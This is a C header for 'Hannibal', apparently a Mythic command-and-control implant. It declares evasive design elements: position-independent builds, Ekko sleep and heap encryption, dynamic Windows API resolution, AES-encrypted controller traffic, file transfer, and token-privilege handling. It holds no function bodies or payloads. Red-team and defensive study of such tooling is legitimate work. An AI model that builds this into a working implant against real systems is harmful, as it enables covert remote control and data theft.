#ifndef HANNIBAL_H
#define HANNIBAL_H


#include "config.h"

// Note: The order of the includes matters.
#include <Native.h>
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <iphlpapi.h>
#include <iptypes.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <wininet.h>
#include <stdint.h>


#include "utility_strings.h"
#include "utility_memory.h"
#include "utility_sleep_ekko.h"
#include "utility_winapi_function_resolution.h"


// Hannibal internal settings

#define CONCURRENT_FILE_DOWNLOADS 5 
#define CONCURRENT_FILE_UPLOADS 5 
#define FILE_DOWNLOAD_CHUNK_SIZE 512000 // Bytes. Agent > Controller
#define FILE_UPLOAD_CHUNK_SIZE 512000 // Bytes. Controller > Agent

#define ENCRYPT_KEY_SIZE 32 // AES keysize
#define LOCAL_ENCRYPT_KEY_SIZE 16 // Randomly generated each run for sleep or heap encryption. 16 bytes to work with Ekko.

#define PTR_OF_TYPE( x )  __typeof__( x ) * x;
#define SECTION_CODE __attribute__( ( section( ".text$CODE" ) ) )
#define SECTION_GLOBAL   __attribute__( ( section( ".global" ) ) )
#define SECTION_RDATA __attribute__( ( section( ".rdata" ) ) )

typedef struct _BUFFER {
    PVOID Buffer;
    ULONG Length;
} BUFFER, *PBUFFER;

#ifdef PIC_BUILD
EXTERN_C ULONG __Instance_offset;
EXTERN_C PVOID __Instance;

EXTERN_C PVOID StRipStart();
EXTERN_C PVOID StRipEnd();

VOID Hannibal(
    _In_ PVOID Param
);

#endif

typedef struct
{
    DWORD	Length;
    DWORD	MaximumLength;
    PVOID	Buffer;
} USTRING;

typedef struct
{ // Tracking file downloads. Agent > Mythic
    LPCSTR task_uuid;
    LPCSTR download_uuid;
    LPCWSTR path;
    UINT64 bytes_sent;
    UINT32 chunks_sent;
    UINT32 chunk_count;
    UINT64 filesize;
} FILE_DOWNLOAD;

typedef struct
{ // Tracking file uploads. Mythic > Agent
    LPCSTR task_uuid;
    LPCSTR upload_uuid;
    LPCWSTR path;
    UINT64 bytes_received;
    UINT32 chunks_received;
    UINT32 chunk_count;
    UINT64 filesize;
} FILE_UPLOAD;


typedef struct _TASK_QUEUE TASK_QUEUE;
typedef struct _TASK_ENTRY TASK_ENTRY;

typedef struct _INSTANCE {

    BUFFER Base;

    struct {

        // Ntdll.dll
        PTR_OF_TYPE( RtlRandomEx )
        PTR_OF_TYPE( NtCreateEvent )
        PTR_OF_TYPE( RtlAllocateHeap )
        PTR_OF_TYPE( RtlCreateTimerQueue )
        PTR_OF_TYPE( NtProtectVirtualMemory )
        PTR_OF_TYPE( RtlCreateTimer )
        PTR_OF_TYPE( RtlRegisterWait ) 
        PTR_OF_TYPE( RtlCaptureContext )
        PTR_OF_TYPE( NtSetEvent )
        PTR_OF_TYPE( NtContinue )
        PTR_OF_TYPE( NtClose )
        PTR_OF_TYPE( NtSignalAndWaitForSingleObject )
        PTR_OF_TYPE( RtlDeleteTimerQueue )
        PTR_OF_TYPE( NtQueryInformationProcess )
        PTR_OF_TYPE( RtlExitUserThread )
        

        // Kernel32.dll
        PTR_OF_TYPE( Sleep )
        PTR_OF_TYPE( FindClose )
        PTR_OF_TYPE( ExitProcess )
        PTR_OF_TYPE( VirtualFree )
        PTR_OF_TYPE( VirtualAlloc )
        PTR_OF_TYPE( VirtualProtect )
        PTR_OF_TYPE( LoadLibraryA )
        PTR_OF_TYPE( GetLastError )
        PTR_OF_TYPE( FindNextFileW )
        PTR_OF_TYPE( DeleteFileW )
        PTR_OF_TYPE( RemoveDirectoryW )
        PTR_OF_TYPE( GetTickCount )
        PTR_OF_TYPE( FindFirstFileW )
        PTR_OF_TYPE( CreateProcessW )
        PTR_OF_TYPE( OpenProcess )
        PTR_OF_TYPE( WaitForSingleObject )
        PTR_OF_TYPE( CreateTimerQueueTimer )
        PTR_OF_TYPE( CreateEventW )
        PTR_OF_TYPE( CreateTimerQueue )
        PTR_OF_TYPE( SetEvent )
        PTR_OF_TYPE( DeleteTimerQueue )
        PTR_OF_TYPE( GetProcAddress )
        PTR_OF_TYPE( GetFileAttributesW )
        PTR_OF_TYPE( CreateFileW )
        PTR_OF_TYPE( GetFileSizeEx )
        PTR_OF_TYPE( SetFilePointer )
        PTR_OF_TYPE( ReadFile )
        PTR_OF_TYPE( CloseHandle )
        PTR_OF_TYPE( WriteFile )
        PTR_OF_TYPE( CopyFileW )
        PTR_OF_TYPE( MoveFileExW )
        PTR_OF_TYPE( Process32FirstW )
        PTR_OF_TYPE( Process32NextW )
        PTR_OF_TYPE( IsWow64Process )
        PTR_OF_TYPE( CreateDirectoryW )
        PTR_OF_TYPE( GetLogicalDrives )
        PTR_OF_TYPE( GetComputerNameExW )
        PTR_OF_TYPE( GetModuleFileNameW )
        PTR_OF_TYPE( GetDiskFreeSpaceExW )
        PTR_OF_TYPE( GetCurrentProcessId )
        PTR_OF_TYPE( SetCurrentDirectoryW )
        PTR_OF_TYPE( FileTimeToSystemTime )
        PTR_OF_TYPE( SystemTimeToFileTime )
        PTR_OF_TYPE( GetCurrentDirectoryW )
        PTR_OF_TYPE( WaitForSingleObjectEx )
        PTR_OF_TYPE( GetVolumeInformationW )
        PTR_OF_TYPE( CreateToolhelp32Snapshot )
        PTR_OF_TYPE( NtSetInformationVirtualMemory )
        

        // User32.dll
        PTR_OF_TYPE( MessageBoxA )
        PTR_OF_TYPE( MessageBoxW )


        // Wininet.dll
        PTR_OF_TYPE( InternetOpenW );
        PTR_OF_TYPE( InternetConnectW );
        PTR_OF_TYPE( HttpOpenRequestW );
        PTR_OF_TYPE( HttpSendRequestW );    
        PTR_OF_TYPE( InternetReadFile );  
        PTR_OF_TYPE( InternetSetOptionW );
        PTR_OF_TYPE( InternetCloseHandle ); 
        PTR_OF_TYPE( InternetQueryOptionW ); 
        PTR_OF_TYPE( HttpAddRequestHeadersW );


        // Advapi32.dll
        NTSTATUS ( WINAPI* SystemFunction032 ) ( USTRING* data, USTRING* key );
        PTR_OF_TYPE( OpenProcessToken );
        PTR_OF_TYPE( LookupAccountSidW );
        PTR_OF_TYPE( GetSidSubAuthority );
        PTR_OF_TYPE( GetTokenInformation );
        PTR_OF_TYPE( LookupPrivilegeValueW );
        PTR_OF_TYPE( AdjustTokenPrivileges );

        
        // Bcrypt.dll
        PTR_OF_TYPE( BCryptGenRandom );
        PTR_OF_TYPE( BCryptOpenAlgorithmProvider );
        PTR_OF_TYPE( BCryptCloseAlgorithmProvider );


        // Iphlpapi.dll
        PTR_OF_TYPE( GetAdaptersAddresses ); // Note: The order of the includes matters.


        // Ws2_32.dll
        PTR_OF_TYPE( InetNtopW ); 

    } Win32;

    struct {
        PVOID Ntdll;
        PVOID Kernel32;
        PVOID User32;
        PVOID WinInet;
        PVOID Advapi32;
        PVOID Bcrypt;
        PVOID Iphlpapi;
        PVOID Ws2_32;
    } Modules;

    struct {

        // Core 
        UINT32 sleep;
        UINT32 jitter;
        CHAR *uuid;
        BOOL checked_in;

        // HTTP
        WCHAR *controller_host;
        WCHAR *http_method;
        WCHAR *user_agent;
        WCHAR *controller_url;

        // Encryption
        CHAR *encrypt_key; // Used in the AES encrypted comms between the controller and agent
        UINT32 encrypt_key_size;
        CHAR *decrypt_key;
        UINT32 decrypt_key_size;
        CHAR *local_encryption_key; // Randomly generated each run for sleep or heap encryption.
        CHAR *local_encryption_key_size; 

    } config;

    struct {

        TASK_QUEUE *tasks_queue; // From controller
        TASK_QUEUE *tasks_response_queue; // To controller
        TASK_ENTRY *task_func_ptrs; // Array of function ptrs pointing to commands
        UINT32 task_func_ptrs_size; // How many function ptrs

        UINT32 download_count; // How many files are being downloaded concurrently
        FILE_DOWNLOAD *file_downloads; // Array tracking which files are being downloaded

        UINT32 upload_count; // How many files are being uploaded concurrently
        FILE_UPLOAD *file_uploads; // Array tracking which files are being uploaded

    } tasks;

} INSTANCE, *PINSTANCE;


/**
 * This enables using the debug build and stepping in GDB in vscode.
 * In PIC_BUILD unless we pass the address as a param to every function that needs it,
 * we have to call StRipStart every time which is not ideal but it works.
 */
#ifdef PIC_BUILD
#define HANNIBAL_INSTANCE_PTR PINSTANCE hannibal_instance_ptr = (PINSTANCE)*(PVOID*)((PVOID)((UINT_PTR)StRipStart() +  (UINT_PTR)&__Instance_offset));    
#else
#define HANNIBAL_INSTANCE_PTR extern PINSTANCE hannibal_instance_ptr;
#endif

void hannibal_exec_tasks();
void hannibal_resolve_pointers();
ULONG generate_sleep_with_jitter(ULONG sleep, ULONG jitter);


#endif